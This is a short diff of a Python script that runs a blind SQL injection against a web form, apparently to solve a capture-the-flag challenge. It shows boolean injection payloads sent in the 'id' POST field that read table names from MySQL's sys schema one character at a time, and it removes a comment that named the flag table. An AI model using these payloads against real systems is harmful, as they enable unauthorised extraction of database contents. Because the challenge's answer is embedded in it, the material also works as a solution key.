@@ -180,7 +180,6 @@ def dump_tablenames():
 		for i in printable:
 			# length of table 1 is :  2 && length((select table_name from sys.x$schema_table_statistics where table_schema=database() limit 0,1))=5 we can guess its users
 			#second table length is : 2 && length((select table_name from sys.x$schema_table_statistics where table_schema=database() limit 1,1))=25
-			#Table name is Th1z_Fack1n_Fl4444G_Tabl3
 			if i!='%':
 				r = requests.post(url,headers={'Content-Type':'application/x-www-form-urlencoded'},data={'id':'2 && ascii(substr((select table_name from sys.x$schema_table_statistics where table_schema=database() limit 1,1),{},25))=ascii("{}")'.format(j,i)})
 				if 'guest' in r.text:
